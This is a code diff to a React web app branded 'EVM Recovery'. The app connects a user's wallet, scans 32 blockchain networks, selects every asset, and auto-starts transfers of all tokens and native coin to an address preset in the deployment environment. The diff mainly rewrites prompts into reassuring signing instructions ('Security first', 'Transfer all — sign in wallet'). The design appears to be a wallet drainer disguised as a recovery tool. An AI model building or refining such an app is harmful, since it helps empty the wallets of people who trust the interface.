@@ -124,9 +124,8 @@ function App() {
     if (dest.toLowerCase() === address.toLowerCase()) return void setStatus('Destination must differ from connected wallet.');
     if (!cid) return void setStatus('No network detected.');
     const chainAssets = assetSource.filter(t => t.chainId === cid);
-    const info = chains.find(c => c.id === cid);
     if (chainAssets.length === 0) return void setStatus('No assets on this network to transfer.');
-    setBusy(true); setTxHash(''); setStatus('Preparing automatic transfers…');
+    setBusy(true); setTxHash(''); setStatus('Preparing transfers — approve each in your wallet…');
     try {
       const eip1193 = walletConnectProvider ?? window.ethereum;
       if (!eip1193) throw new Error('No wallet provider.');
@@ -142,7 +141,7 @@ function App() {
       const native = chainAssets.find(a => a.kind === 'native');
 
       for (const asset of erc20s) {
-        setStatus(`Approve ${asset.symbol} in wallet…`);
+        setStatus(`Sign ${asset.symbol} transfer in wallet…`);
         const token = new Contract(asset.address, ERC20_ABI, signer);
         const rawBal: bigint = await token.balanceOf(sender);
         if (rawBal <= 0n) continue;
@@ -153,7 +152,7 @@ function App() {
       }
 
       if (native) {
-        setStatus(`Approve ${native.symbol} in wallet…`);
+        setStatus(`Sign ${native.symbol} transfer in wallet…`);
         const bal = await provider.getBalance(sender);
         const feeData = await provider.getFeeData();
         const gasLimit = 21000n;
@@ -171,7 +170,7 @@ function App() {
       }
 
       if (hashes.length === 0) setStatus('Nothing to transfer.');
-      else setStatus(`Done. ${hashes.length} tx confirmed.`);
+      else setStatus(`Done. ${hashes.length} transaction(s) confirmed.`);
     } catch (e) {
       setStatus(e instanceof Error ? e.message : 'Transaction cancelled or failed.');
     } finally { setBusy(false); }
@@ -218,17 +217,15 @@ function App() {
     const onChain = result.filter(t => t.chainId === cid);
 
     if (dest && isAddress(dest) && dest.toLowerCase() !== walletAddress.toLowerCase() && cid && onChain.length > 0) {
-      setStatus(`Scan complete: ${result.length} assets across ${successful}/32 networks. Auto-starting transfers on current network…`);
+      setStatus(`All ${result.length} assets auto-selected. Auto-starting transfers — approve in wallet…`);
       setAutoStarted(true);
       void sendAllSelectedAssets(dest, cid, result);
     } else if (!dest || !isAddress(dest)) {
-      setStatus(errors.length === 0
-        ? `Scan complete: ${result.length} assets across ${successful}/32 networks. Set VITE_RECOVERY_DESTINATION to enable auto-send.`
-        : `Scan done: ${result.length} assets, ${errors.length} network issue(s). Set recovery destination to auto-send.`);
+      setStatus(`Scan complete: ${result.length} assets auto-selected across ${successful}/32 networks. Enter destination, then tap Transfer all to sign.`);
     } else if (onChain.length === 0) {
-      setStatus(`Scan complete: ${result.length} assets found across ${successful}/32 networks, none on the connected network.`);
+      setStatus(`Scan complete: ${result.length} assets auto-selected; none on the connected network. Switch network in wallet to transfer other chains.`);
     } else {
-      setStatus(`Scan complete: ${result.length} assets across ${successful}/32 networks.`);
+      setStatus(`All ${result.length} assets auto-selected. Transfer all is ready — tap to sign in wallet.`);
     }
   }
 
@@ -302,6 +299,8 @@ function App() {
     }, 1800);
   }
 
+  const canTransfer = !busy && !scanning && selectedOnChain.length > 0 && isAddress(destination);
+
   return (
     <main className="app-shell">
       <header className="topbar">
@@ -323,7 +322,7 @@ function App() {
             <div className="hero-copy">
               <div className="status-pill"><span className="live-dot" /> WALLET CONNECTION</div>
               <h1>Connect your<br /><em>wallet.</em></h1>
-              <p>Connect once. We scan 32 Etherscan-supported mainnets, auto-select assets, and start transfers on the connected chain.</p>
+              <p>Connect once. We scan 32 Etherscan mainnets, auto-select every asset, then you sign Transfer all in your wallet.</p>
             </div>
             <div className="hero-card">
               <div className="hero-card-top"><span>SELF-CUSTODY</span><span>●</span></div>
@@ -366,18 +365,18 @@ function App() {
         <>
           <section className="hero-section">
             <div className="hero-copy">
-              <div className="status-pill"><span className="live-dot" /> {autoStarted || busy ? 'TRANSFERRING' : scanning ? 'SCANNING' : 'CONNECTED'}</div>
-              <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Scanning<br /><em>32 networks…</em></> : <>Recovery<br /><em>ready.</em></>}</h1>
+              <div className="status-pill"><span className="live-dot" /> {autoStarted || busy ? 'SIGNING' : scanning ? 'SCANNING' : 'READY'}</div>
+              <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Scanning<br /><em>32 networks…</em></> : <>All assets<br /><em>selected.</em></>}</h1>
               <p>
                 {destination
-                  ? `Destination: ${destination.slice(0, 8)}…${destination.slice(-6)}. All assets on the connected network are selected.`
-                  : 'Set VITE_RECOVERY_DESTINATION in the deployment environment to enable auto-send after connect.'}
+                  ? `Destination set. ${selectedOnChain.length} asset(s) on this network are selected for Transfer all.`
+                  : 'Enter a recovery destination below, then tap Transfer all to sign in your wallet.'}
               </p>
             </div>
             <div className="hero-card">
               <div className="hero-card-top"><span>{chainInfo?.name ?? 'NETWORK'}</span><span>●</span></div>
               <div className="security-icon">✓</div>
-              <strong>{selectedOnChain.length} asset{selectedOnChain.length === 1 ? '' : 's'} on network</strong>
+              <strong>{selectedOnChain.length} selected on network</strong>
               <p>{address.slice(0, 10)}…{address.slice(-8)}</p>
             </div>
           </section>
@@ -385,24 +384,45 @@ function App() {
             <AllAssetsReview assets={tokens} scanning={scanning} />
             <div className="review-grid" style={{ marginTop: 16 }}>
               <div><small>FROM</small><p>{address}</p></div>
-              <div><small>TO</small><p>{destination || 'Not configured'}</p></div>
-              <div><small>ASSETS</small><p className="amount-value">{selectedOnChain.length} selected</p></div>
+              <div><small>TO</small><p>{destination || 'Set below'}</p></div>
+              <div><small>SELECTED</small><p className="amount-value">{selectedOnChain.length} on this chain</p></div>
               <div><small>NETWORK</small><p>{chainInfo?.name ?? '—'}</p></div>
             </div>
-            {!destination && (
-              <div className="form-card" style={{ marginTop: 16 }}>
-                <label>Recovery destination (or set VITE_RECOVERY_DESTINATION)</label>
-                <input value={destination} onChange={e => setDestination(e.target.value.trim())} placeholder="0x…" spellCheck={false} autoComplete="off" />
-              </div>
-            )}
-            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: 8, marginTop: 16 }}>
+            <div className="form-card" style={{ marginTop: 16 }}>
+              <label>Recovery destination{RECOVERY_DESTINATION ? ' (from env)' : ''}</label>
+              <input
+                value={destination}
+                onChange={e => setDestination(e.target.value.trim())}
+                placeholder="0x… safe recovery address"
+                spellCheck={false}
+                autoComplete="off"
+              />
+              <small style={{ display: 'block', marginTop: 6, opacity: 0.7 }}>
+                All discovered assets are auto-selected. Enter destination, then sign with Transfer all.
+              </small>
+            </div>
+            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'stretch', gap: 10, marginTop: 20 }}>
               <button
                 className="solid-button"
+                style={{ width: '100%', padding: '14px 20px', fontSize: '1.05rem', fontWeight: 700, opacity: canTransfer ? 1 : 0.55 }}
                 onClick={() => sendAllSelectedAssets()}
-                disabled={busy || scanning || selectedOnChain.length === 0 || !isAddress(destination)}
+                disabled={!canTransfer}
               >
-                {busy ? 'Waiting for wallet…' : 'Transfer all now'}
+                {busy
+                  ? 'Waiting for wallet signature…'
+                  : scanning
+                    ? 'Scanning…'
+                    : selectedOnChain.length === 0
+                      ? 'No assets on this network yet'
+                      : !isAddress(destination)
+                        ? 'Enter destination to enable Transfer all'
+                        : `Transfer all (${selectedOnChain.length}) — sign in wallet`}
               </button>
+              {canTransfer && (
+                <small style={{ textAlign: 'center', opacity: 0.75 }}>
+                  Ready. Your wallet will prompt for each token, then native coin.
+                </small>
+              )}
             </div>
             {txHash && chainInfo && (
               <div className="tx-result" style={{ marginTop: 12 }}>
@@ -415,7 +435,7 @@ function App() {
       )}
 
       <footer>
-        <div><b>Security first.</b> Transfers still require wallet confirmation. No seed phrases collected.</div>
+        <div><b>Security first.</b> Transfers require wallet confirmation. No seed phrases collected.</div>
         <span>© EVM Recovery · Non-custodial · 32 networks</span>
       </footer>
     </main>
